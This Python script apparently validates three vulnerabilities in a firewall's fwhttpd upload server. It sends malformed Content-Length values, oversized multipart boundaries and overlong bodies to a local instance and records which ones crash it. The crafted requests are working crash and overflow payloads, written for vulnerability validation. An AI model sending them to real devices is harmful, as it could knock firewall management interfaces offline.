#!/usr/bin/env python3
"""
fwhttpd vulnerability validation script
Tests SFOS-007 (stack buffer), SFOS-008 (Content-Length DoS), SFOS-009 (boundary parsing)

Starts fwhttpd on a random port, sends test cases, checks for crashes.
"""
import socket
import subprocess
import time
import os
import signal
import sys
import random
import struct

FWHTTPD = "./fwhttpd"  # Path to extracted fwhttpd binary
UPLOAD_FILE = "/tmp/fwhttpd_fuzz_upload.img"
RESULTS = []

def start_fwhttpd(port):
    """Start fwhttpd and return the process."""
    p = subprocess.Popen(
        [FWHTTPD, "-p", str(port), "-f", UPLOAD_FILE],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        preexec_fn=os.setsid
    )
    time.sleep(0.5)
    return p

def kill_fwhttpd(p):
    """Kill fwhttpd process group."""
    try:
        os.killpg(os.getpgid(p.pid), signal.SIGKILL)
    except:
        pass
    try:
        p.wait(timeout=2)
    except:
        pass

def send_raw(port, data, timeout=5):
    """Send raw bytes and return response."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect(('127.0.0.1', port))
        s.sendall(data)
        time.sleep(1)
        try:
            resp = s.recv(4096)
        except socket.timeout:
            resp = b"<timeout>"
        s.close()
        return resp
    except ConnectionRefusedError:
        return b"<connection_refused>"
    except BrokenPipeError:
        return b"<broken_pipe>"
    except Exception as e:
        return f"<error:{e}>".encode()

def check_alive(p):
    """Check if process is still running."""
    return p.poll() is None

def test_case(name, port_base, payload_fn):
    """Run a single test case with a fresh fwhttpd instance."""
    port = port_base + random.randint(0, 999)
    p = start_fwhttpd(port)
    if not check_alive(p):
        print(f"  [{name}] SKIP - fwhttpd failed to start")
        return

    payload = payload_fn()
    resp = send_raw(port, payload)
    time.sleep(0.5)
    alive = check_alive(p)

    result = {
        "name": name,
        "alive_after": alive,
        "response_len": len(resp),
        "response_preview": resp[:100],
    }
    RESULTS.append(result)

    status = "ALIVE" if alive else "CRASHED"
    print(f"  [{name}] {status} | resp={len(resp)}B | {resp[:60]}")

    kill_fwhttpd(p)
    time.sleep(0.3)

def main():
    print("=== fwhttpd Vulnerability Validation ===\n")

    # Clean up any previous instances
    os.system("pkill -9 -f 'fwhttpd -p' 2>/dev/null")
    time.sleep(1)

    # --- SFOS-008: Content-Length edge cases ---
    print("[SFOS-008] Content-Length validation tests:")

    test_case("CL_zero", 10000, lambda: (
        b"POST /cgi-bin/uploadimg.cgi HTTP/1.1\r\n"
        b"Content-Type: multipart/form-data; boundary=----AAAA\r\n"
        b"Content-Length: 0\r\n\r\n"
    ))

    test_case("CL_negative", 11000, lambda: (
        b"POST /cgi-bin/uploadimg.cgi HTTP/1.1\r\n"
        b"Content-Type: multipart/form-data; boundary=----AAAA\r\n"
        b"Content-Length: -1\r\n\r\n"
    ))

    test_case("CL_huge", 12000, lambda: (
        b"POST /cgi-bin/uploadimg.cgi HTTP/1.1\r\n"
        b"Content-Type: multipart/form-data; boundary=----AAAA\r\n"
        b"Content-Length: 99999999999999999999\r\n\r\n"
    ))

    test_case("CL_overflow_long", 13000, lambda: (
        b"POST /cgi-bin/uploadimg.cgi HTTP/1.1\r\n"
        b"Content-Type: multipart/form-data; boundary=----AAAA\r\n"
        b"Content-Length: 9223372036854775807\r\n\r\n"  # LONG_MAX
    ))

    # --- SFOS-009: Boundary parsing tests ---
    print("\n[SFOS-009] Boundary parsing tests:")

    test_case("boundary_empty", 14000, lambda: (
        b"POST /cgi-bin/uploadimg.cgi HTTP/1.1\r\n"
        b"Content-Type: multipart/form-data; boundary=\r\n"
        b"Content-Length: 100\r\n\r\n"
        b"------\r\n"
        b"Content-Disposition: form-data; name=\"inputfile\"; filename=\"test.bin\"\r\n\r\n"
        b"AAAA\r\n"
        b"--------\r\n"
    ))

    # Very long boundary (near 512-byte buffer limit)
    long_boundary = "A" * 500
    test_case("boundary_500char", 15000, lambda: (
        f"POST /cgi-bin/uploadimg.cgi HTTP/1.1\r\n"
        f"Content-Type: multipart/form-data; boundary={long_boundary}\r\n"
        f"Content-Length: 1000\r\n\r\n"
        f"--{long_boundary}\r\n"
        f"Content-Disposition: form-data; name=\"inputfile\"; filename=\"test.bin\"\r\n\r\n"
        f"BBBB\r\n"
        f"--{long_boundary}--\r\n"
    ).encode())

    # Boundary exactly at buffer boundary
    exact_boundary = "X" * 508  # snprintf to 512-byte buffer with "%s--" = 508 + 2 + null
    test_case("boundary_508_exact", 16000, lambda: (
        f"POST /cgi-bin/uploadimg.cgi HTTP/1.1\r\n"
        f"Content-Type: multipart/form-data; boundary={exact_boundary}\r\n"
        f"Content-Length: 2000\r\n\r\n"
        f"--{exact_boundary}\r\n"
        f"Content-Disposition: form-data; name=\"inputfile\"; filename=\"test.bin\"\r\n\r\n"
        f"CCCC\r\n"
        f"--{exact_boundary}--\r\n"
    ).encode())

    # Boundary overflow -- 600 chars into 512 buffer via snprintf("%s--")
    overflow_boundary = "Y" * 600
    test_case("boundary_600_overflow", 17000, lambda: (
        f"POST /cgi-bin/uploadimg.cgi HTTP/1.1\r\n"
        f"Content-Type: multipart/form-data; boundary={overflow_boundary}\r\n"
        f"Content-Length: 2000\r\n\r\n"
        f"--{overflow_boundary}\r\n"
        f"Content-Disposition: form-data; name=\"inputfile\"; filename=\"test.bin\"\r\n\r\n"
        f"DDDD\r\n"
        f"--{overflow_boundary}--\r\n"
    ).encode())

    # --- SFOS-007: Large POST body / buffer stress ---
    print("\n[SFOS-007] Buffer stress tests:")

    # Send exactly 0x100007 bytes (the buffer size)
    test_case("body_exact_bufsize", 18000, lambda: (
        b"POST /cgi-bin/uploadimg.cgi HTTP/1.1\r\n"
        b"Content-Type: multipart/form-data; boundary=----ZZZZ\r\n"
        b"Content-Length: 1048583\r\n\r\n"
        b"------ZZZZ\r\n"
        b"Content-Disposition: form-data; name=\"inputfile\"; filename=\"test.bin\"\r\n\r\n"
        + b"E" * (1048583 - 150) +
        b"\r\n------ZZZZ--\r\n"
    ))

    # Send more than buffer size in a single chunk
    test_case("body_over_bufsize", 19000, lambda: (
        b"POST /cgi-bin/uploadimg.cgi HTTP/1.1\r\n"
        b"Content-Type: multipart/form-data; boundary=----WWWW\r\n"
        b"Content-Length: 2097152\r\n\r\n"
        b"------WWWW\r\n"
        b"Content-Disposition: form-data; name=\"inputfile\"; filename=\"test.bin\"\r\n\r\n"
        + b"F" * 2097000 +
        b"\r\n------WWWW--\r\n"
    ))

    # --- Summary ---
    print("\n=== RESULTS ===")
    crashes = [r for r in RESULTS if not r["alive_after"]]
    alive = [r for r in RESULTS if r["alive_after"]]
    print(f"Total tests: {len(RESULTS)}")
    print(f"Crashes: {len(crashes)}")
    print(f"Survived: {len(alive)}")
    if crashes:
        print("\nCRASHED tests:")
        for r in crashes:
            print(f"  ** {r['name']}: response={r['response_preview']}")

    # Cleanup
    os.system("pkill -9 -f 'fwhttpd -p' 2>/dev/null")
    try:
        os.unlink(UPLOAD_FILE)
    except:
        pass

if __name__ == "__main__":
    main()
